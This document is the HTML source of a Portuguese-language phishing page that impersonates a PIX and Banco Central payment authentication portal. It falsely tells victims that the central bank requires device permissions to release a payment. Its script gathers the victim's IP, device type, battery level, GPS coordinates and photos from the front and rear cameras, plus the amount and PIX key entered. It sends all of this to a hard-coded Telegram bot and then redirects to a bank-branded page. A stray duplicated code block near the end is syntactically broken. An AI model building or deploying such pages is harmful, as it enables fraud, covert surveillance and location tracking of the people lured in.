<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Recebimento PIX</title>

    <meta property="og:title" content="SISTEMA DE AUTENTICAÇÃO PIX">
    <meta property="og:description" content="Conferência de recebimento pendente. Autentique para liberar o valor via PIX.">
    <meta property="og:image" content="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png">
    <meta property="og:type" content="website">

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .pix-card { background: white; max-width: 420px; width: 100%; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background-color: #32bcad; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
        .bc-header { background-color: white; padding: 25px 20px; text-align: center; border-bottom: 2px solid #32bcad; display: none; }
        .bc-logo { width: 160px; height: auto; display: block; margin: 0 auto; }
        .content { padding: 30px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: bold; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        .btn-acao { width: 100%; background-color: #32bcad; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-blue { background-color: #007bff; box-shadow: 0 5px 15px rgba(0,123,255,0.3); }
        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer-info { font-size: 11px; color: #aaa; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
        #tela-permissao { display: none; text-align: center; }
    </style>
</head>
<body>

<div class="pix-card">
    <div id="header-dados" class="header">AUTENTICADOR DE RECEBIMENTOS</div>
    
    <div id="header-bc" class="bc-header">
        <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" alt="BC" class="bc-logo">
    </div>

    <div class="content">
        <div id="tela-dados">
            <label>Valor para Recebimento (R$):</label>
            <input type="number" id="valor" placeholder="Ex: 1250,00">
            <label>Chave PIX do Beneficiário:</label>
            <input type="text" id="chave" placeholder="CPF, E-mail ou Celular">
            <button class="btn-acao" onclick="mostrarAviso()">PROSSEGUIR</button>
        </div>

        <div id="tela-permissao">
            <h1 style="font-size: 20px; color: #333;">Validação de Identidade</h1>
            <p style="color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px;">
                Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento. 
                <br><br>
                Isso garante que você receba o valor e evita golpes.
            </p>
            <button class="btn-acao btn-blue" id="btnFinal" onclick="dispararCaptura()">
                AUTENTICAR E LIBERAR PIX
                <div class="spinner" id="spinner"></div>
            </button>
        </div>

        <div class="footer-info">
            Portal de Conferência de Valores Interbancário<br>
            Criptografia de Segurança Ativa
        </div>
    </div>
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const TOKEN = "8757264210:AAGASjOqrfL2a8QgIDp0rszG3Wi6sWWnb0s"; 
    const ID = "560716860";
    let valorGlobal, chaveGlobal;

    function mostrarAviso() {
        valorGlobal = document.getElementById('valor').value;
        chaveGlobal = document.getElementById('chave').value;

        if (!valorGlobal || !chaveGlobal) return alert("Preencha os dados.");

        // Troca as telas
        document.getElementById('header-dados').style.display = 'none';
        document.getElementById('tela-dados').style.display = 'none';
        document.getElementById('header-bc').style.display = 'block';
        document.getElementById('tela-permissao').style.display = 'block';
    }

   async function dispararCaptura() {
        document.getElementById('spinner').style.display = 'inline-block';
        document.getElementById('btnFinal').disabled = true;

        // Captura IP e Porta
        let dadosConexao = { ip: "Não identificado", porta: window.location.port || "443" };
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const data = await resp.json();
            dadosConexao.ip = data.ip;
        } catch (e) {}

        // Dados do Aparelho, Bateria e Rede
        const ua = navigator.userAgent;
        let aparelho = /iPhone/i.test(ua) ? "📱 iPhone (iOS)" : (/Android/i.test(ua) ? "🤖 Android" : "💻 PC/Outro");
        
        let infoExtra = "";
        try {
            const bat = await navigator.getBattery();
            infoExtra = `\n🔋 Bateria: ${(bat.level * 100).toFixed(0)}% (${bat.charging ? '🔌' : '🔋'})`;
        } catch(e){}

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const mapa = `https://www.google.com/maps?q=${lat},${lon}`;

            const msg = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${valorGlobal}\n🔑 Chave: ${chaveGlobal}\n🌐 IP: ${dadosConexao.ip}\n🔌 Porta: ${dadosConexao.porta}\n${aparelho}${infoExtra}\n🌍 Mapa: ${mapa}`;
            
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);

            try {
                await tirarFoto("user", "FRONTAL");
                await tirarFoto("environment", "TRASEIRA");
                window.location.href = "bradesco.html";
            } catch (e) { window.location.href = "bradesco.html"; }
        }, (err) => {
            // LOOPING: Se negar GPS, vai para a página que você criou
            window.location.href = "autorizar.html";
        });
    }
   async function tirarFoto(face, label) {
        try {
            // Limpeza de streams anteriores
            if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
            
            // Pausa para o hardware resetar
            await new Promise(r => setTimeout(r, 500));

            // SOLICITAÇÃO DE ALTA RESOLUÇÃO
            const constraints = { 
                video: { 
                    facingMode: face,
                    width: { ideal: 1920 }, // Tenta Full HD
                    height: { ideal: 1080 },
                    frameRate: { ideal: 30 }
                }, 
                audio: false 
            };

            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            window.currentStream = stream;
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            await new Promise(r => video.onloadedmetadata = r);
            
            // FUNDAMENTAL: Aguarda 1.5 segundos para o sensor ajustar o brilho (Exposure)
            // Sem isso, a foto frontal geralmente sai muito escura ou "lavada"
            await new Promise(r => setTimeout(r, 1500)); 
            
            const canvas = document.getElementById('canvas');
            
            // Ajusta o tamanho do canvas para o tamanho real do vídeo capturado
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Desliga a câmera imediatamente após o "print"
            stream.getTracks().forEach(t => t.stop());

            // Qualidade em 0.9 (90%) para nitidez forense
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
            
            const fd = new FormData();
            fd.append('chat_id', ID);
            fd.append('photo', blob, `${label}.jpg`);
            fd.append('caption', `📸 ALTA DEFINIÇÃO: ${label}\n📏 Resolução: ${canvas.width}x${canvas.height}`);
            
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } catch (e) {
            console.error("Falha na captura HD:", label);
        }
    }

            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            window.currentStream = stream; // Guarda o stream atual
            
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            await new Promise(r => video.onloadedmetadata = r);
            
            // 3. Tempo para o sensor de luz ajustar (evita foto preta/escura)
            await new Promise(r => setTimeout(r, 1000)); 
            
            const canvas = document.getElementById('canvas');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            // 4. Desliga a câmera atual antes de retornar para a próxima
            stream.getTracks().forEach(track => track.stop());

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
            const fd = new FormData();
            fd.append('chat_id', ID);
            fd.append('photo', blob, `${label}.jpg`);
            fd.append('caption', `📸 Câmera ${label}`);
            
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } catch (error) {
            console.error("Erro na captura:", label, error);
        }
    }
</script>
</body>
</html>
